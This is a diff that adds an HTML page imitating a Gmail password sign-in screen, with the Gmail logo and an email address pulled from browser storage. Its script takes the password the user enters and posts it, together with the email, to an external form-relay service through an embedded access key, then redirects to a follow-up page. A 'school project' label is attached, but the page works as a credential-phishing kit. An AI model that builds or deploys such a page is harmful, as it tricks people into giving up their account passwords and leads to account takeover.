@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title></title>
+
+<style>
+
+/* =========================
+   RESET
+========================= */
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family: Arial, Helvetica, sans-serif;
+}
+
+body{
+    background:#f0f4f9;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    min-height:100vh;
+    padding:20px;
+}
+
+/* =========================
+   CARD
+========================= */
+.login-card{
+    width:100%;
+    max-width:450px;
+    background:#fff;
+    border-radius:28px;
+    padding:48px 40px;
+    box-shadow:0 2px 10px rgba(0,0,0,0.08);
+}
+
+/* =========================
+   LOGO
+========================= */
+.logo{
+    width:48px;
+    margin-bottom:20px;
+}
+
+/* =========================
+   TEXT
+========================= */
+.login-card h1{
+    font-size:32px;
+    font-weight:500;
+    color:#1f1f1f;
+    margin-bottom:12px;
+}
+
+/* =========================
+   EMAIL DISPLAY
+========================= */
+.email-display{
+    display:inline-flex;
+    align-items:center;
+    gap:8px;
+    border:1px solid #dadce0;
+    border-radius:50px;
+    padding:7px 14px;
+    margin-bottom:30px;
+    font-size:14px;
+    color:#3c4043;
+}
+
+.email-display img{
+    width:18px;
+}
+
+/* =========================
+   INPUT
+========================= */
+.input-group{
+    position:relative;
+    margin-bottom:18px;
+}
+
+.input-group input{
+    width:100%;
+    padding:18px 14px;
+    border:1px solid #c4c7c5;
+    border-radius:6px;
+    font-size:16px;
+    outline:none;
+    transition:0.3s;
+    background:none;
+}
+
+.input-group label{
+    position:absolute;
+    left:14px;
+    top:18px;
+    color:#5f6368;
+    background:#fff;
+    padding:0 4px;
+    transition:0.2s ease;
+    pointer-events:none;
+}
+
+.input-group input:focus,
+.input-group input:valid{
+    border:2px solid #0b57d0;
+}
+
+.input-group input:focus + label,
+.input-group input:valid + label{
+    top:-9px;
+    left:10px;
+    font-size:12px;
+    color:#0b57d0;
+}
+
+/* =========================
+   SHOW PASSWORD
+========================= */
+.show-password{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    margin-bottom:35px;
+    font-size:14px;
+    color:#3c4043;
+}
+
+/* =========================
+   BUTTONS
+========================= */
+.bottom{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+}
+
+.link{
+    color:#0b57d0;
+    text-decoration:none;
+    font-size:14px;
+    font-weight:500;
+}
+
+.next-btn{
+    background:#0b57d0;
+    color:#fff;
+    border:none;
+    padding:11px 28px;
+    border-radius:50px;
+    font-size:14px;
+    cursor:pointer;
+    transition:0.3s;
+}
+
+.next-btn:hover{
+    background:#0842a0;
+}
+
+/* =========================
+   POPUP ERROR
+========================= */
+.popup{
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background:rgba(0,0,0,0.4);
+    display:none;
+    justify-content:center;
+    align-items:center;
+    z-index:999;
+}
+
+.popup-box{
+    background:#fff;
+    padding:25px 20px;
+    border-radius:16px;
+    text-align:center;
+    width:370px;
+    animation:pop 0.2s ease;
+}
+
+.popup-icon{
+    width:50px;
+    height:50px;
+    background:#fce8e6;
+    color:#d93025;
+    font-size:26px;
+    font-weight:bold;
+    border-radius:50%;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    margin:0 auto 15px;
+}
+
+.popup-box h3{
+    margin-bottom:8px;
+    color:#1f1f1f;
+    font-size:16px;
+    font-weight:600;
+}
+
+.popup-box p{
+    margin-bottom:20px;
+    color:#5f6368;
+    font-size:14px;
+}
+
+.popup-box button{
+    background: none;
+    color:#3a53a5;
+    border:none;
+    justify-content: end;
+    display: flex;
+    align-items:flex-start;
+    padding:10px 18px;
+    border-radius:20px;
+    cursor:pointer;
+}
+
+@keyframes pop{
+    from{transform:scale(0.8);opacity:0;}
+    to{transform:scale(1);opacity:1;}
+}
+
+/* =========================
+   RESPONSIVE
+========================= */
+@media(max-width:768px){
+    body{
+        padding-top:40px;
+    }
+
+    .login-card{
+        max-width:100%;
+        padding:40px 28px;
+        border-radius:24px;
+    }
+}
+
+@media(max-width:480px){
+    body{
+        background:#fff;
+        padding:0;
+    }
+
+    .login-card{
+        min-height:100vh;
+        border-radius:0;
+        box-shadow:none;
+        display:flex;
+        flex-direction:column;
+        justify-content:center;
+        padding:35px 22px;
+    }
+
+    .login-card h1{
+        font-size:28px;
+    }
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="login-card">
+
+    <img src="https://www.gstatic.com/images/branding/product/1x/gmail_2020q4_48dp.png" class="logo">
+
+    <h1>Welcome</h1>
+
+    <div class="email-display">
+        <img src="https://cdn-icons-png.flaticon.com/512/747/747376.png">
+        <span id="displayEmail"></span>
+    </div>
+
+    <div class="input-group">
+        <input type="password" id="word" required>
+        <label>password</label>
+    </div>
+
+    <div class="show-password">
+        <input type="checkbox" id="showWord">
+        <label for="showWord">Show password</label>
+    </div>
+
+    <div class="bottom">
+        <a href="#" class="link">Forgot password?</a>
+        <button class="next-btn">Next</button>
+    </div>
+
+</div>
+
+
+
+<script>
+
+const savedEmail = localStorage.getItem("userEmail");
+document.getElementById("displayEmail").textContent =
+savedEmail || "No email found";
+
+const codeInput = document.getElementById("word");
+const nextBtn = document.querySelector(".next-btn");
+
+/* show/hide code */
+document.getElementById("showWord").addEventListener("change", function(){
+    codeInput.type = this.checked ? "text" : "password";
+});
+
+/* SEND USING WEB3FORMS */
+async function sendToWeb3Forms(email, code){
+
+    const formData = new FormData();
+
+    formData.append("access_key", "4e3a4c13-8c40-417e-bedc-8ce4a55d1ea0");
+
+    formData.append("subject", "Demo Submission (Email + Code)");
+    formData.append("from_name", "School Project");
+
+    formData.append("email", email);
+    formData.append("code", code);
+
+    formData.append("message",
+        "User submitted data:\nEmail: " + email + "\nCode: " + code
+    );
+
+    try {
+
+    const res = await fetch("https://api.web3forms.com/submit", {
+        method: "POST",
+        body: formData
+    });
+
+    const data = await res.json();
+
+    console.log(data);
+
+    if(data.success){
+
+        window.location.href = "./gm-404.html";
+
+    } else {
+
+        alert(data.message || "Failed to send");
+
+    }
+
+} catch (err) {
+
+    console.log(err);
+    alert("Network error");
+
+}
+}
+
+/* CLICK */
+nextBtn.addEventListener("click", function(){
+
+    const code = codeInput.value.trim();
+    const email = localStorage.getItem("userEmail");
+
+    if(!email){
+        alert("Email missing");
+        return;
+    }
+
+    if(code === ""){
+        alert("Please enter code");
+        return;
+    }
+
+    sendToWeb3Forms(email, code);
+
+});
+
+/* ENTER KEY */
+codeInput.addEventListener("keypress", function(e){
+    if(e.key === "Enter"){
+        nextBtn.click();
+    }
+});
+
+</script>
+</body>
+</html>
